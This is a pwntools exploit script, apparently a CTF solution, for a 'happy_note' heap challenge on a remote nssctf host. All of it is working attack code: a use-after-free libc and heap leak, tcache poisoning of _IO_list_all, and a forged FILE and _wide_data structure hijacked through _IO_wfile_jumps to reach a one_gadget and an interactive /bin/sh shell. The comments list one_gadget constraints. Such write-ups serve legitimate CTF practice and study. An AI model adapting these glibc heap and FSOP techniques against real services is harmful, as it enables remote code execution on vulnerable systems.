from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node3.anna.nssctf.cn",28065)
# io=process("./happy_note")
libc=ELF("./libc.so.6")

def add(s,n,m):
    io.sendlineafter(b">> ",b"1")
    io.sendlineafter(b"size:\n",str(s))
    io.sendlineafter(b"note:\n",str(n))
    io.sendlineafter(b"[2]\n",str(m)) #1->calloc  2->malloc 

def delete(n):
    io.sendlineafter(b">> ",b"2")
    io.sendlineafter(b"note:\n",str(n))
    
def show(n):
    io.sendlineafter(b">> ",b"3")
    io.sendlineafter(b"show?\n",str(n))

def edit(n,cc):
    io.sendlineafter(b">> ",b"4")
    io.sendlineafter(b"note:\n",str(n))
    io.sendafter(b"content:\n",cc)

def func(n):
    io.sendlineafter(b">> ",b"666")
    io.sendlineafter(b"note:\n",str(n))
    
def build_fake_file(addr, vtable, _wide_data, rdx=0):
    # fake_file = p64(flag)  # _flags
    # fake_file += p64(addr)  # _IO_read_ptr
    fake_file = b""
    fake_file += p64(addr)  # _IO_read_end
    fake_file += p64(addr)  # _IO_read_base
    fake_file += p64(addr)  # _IO_write_base
    fake_file += p64(addr + 1)  # _IO_write_ptr
    fake_file += p64(rdx)  # _IO_write_end
    fake_file += p64(addr)  # _IO_buf_base
    fake_file += p64(0)  # _IO_buf_end
    fake_file += p64(0)  # _IO_save_base
    fake_file += p64(0)  # _IO_backup_base
    fake_file += p64(0)  # _IO_save_end
    fake_file += p64(0)  # _markers
    fake_file += p64(0)  # _chain   could be a anathor file struct
    fake_file += p32(1)  # _fileno
    fake_file += p32(0)  # _flags2
    fake_file += p64(0)  # _old_offset
    fake_file += p16(0)  # _cur_column
    fake_file += p8(0)  # _vtable_offset
    fake_file += p8(0x10)  # _shortbuf
    fake_file += p32(0)
    fake_file += p64(0)  # _lock
    fake_file += p64(0)  # _offset
    fake_file += p64(0)  # _codecvt
    fake_file += p64(_wide_data)  # _wide_data
    fake_file += p64(0)  # _freeres_list
    fake_file += p64(0)  # _freeres_buf
    fake_file += p64(0)  # __pad5
    fake_file += p32(0)  # _mode
    fake_file += p32(0)  # unused2
    fake_file += p64(0) * 2  # unused2
    fake_file += p64(vtable)  # vtable
    return fake_file

# gdb.attach(io)
# pause()

for i in range(11):
    add(0x100,i,1)

for i in range(7):
    delete(i)

func(7)
show(7)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x219ce0
print("leak_addr: "+hex(leak_addr))


_IO_list_all=leak_addr+libc.sym[b"_IO_list_all"]
_IO_list_all_chain=_IO_list_all+0x88
_IO_wfile_jumps=leak_addr+libc.sym[b"_IO_wfile_jumps"]
sys_addr=leak_addr+libc.sym[b"system"]
shell=leak_addr+0xebcf1


add(0x100,0,1) #7

delete(9)
delete(7) #tcachebin 0

show(0) #tcachebin 0
io.recvuntil(b"content: ")
heap_addr=u64(io.recv(6).ljust(8,b"\x00"))-0xc20
key=heap_addr>>12
print("heap_addr: "+hex(heap_addr))

add(0x100,2,1)
add(0xe8,3,1) #new 0 , uaf , editable
add(0xe8,4,1)

delete(4)
delete(3)

edit(0,p64(key^_IO_list_all))

add(0xe8,5,2) #5
add(0xe8,6,2) #6

add(0x1e8,7,1) #7
add(0x200,11,1) #11
#chunk 10  heap_addr+0xd30
fake_wide_data=heap_addr+0xd40 #chunk 10 content 
fake_jump=heap_addr+0xf30 # chunk 7
fake_IO=heap_addr+0x1120 # chunk 11

_wide_data=b""
_wide_data=_wide_data.ljust(0x18,b"\x00")+p64(0)
_wide_data=_wide_data.ljust(0x30,b"\x00")+p64(0)
_wide_data=_wide_data.ljust(0xe0,b"\x00")+p64(fake_jump)
edit(10,_wide_data)


edit(6,p64(fake_IO))
payload=b"\x00"*0x58+p64(shell)
payload=payload.ljust(0x1e0,b"\x00")+b"  sh;"
edit(7,payload)
edit(11,build_fake_file(0,_IO_wfile_jumps,fake_wide_data,0))

delete(9)


io.interactive()

# 0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve("/bin/sh", r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve("/bin/sh", rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebd52 execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [r12] == NULL || r12 == NULL

# 0xebdaf execve("/bin/sh", rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebdb3 execve("/bin/sh", rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
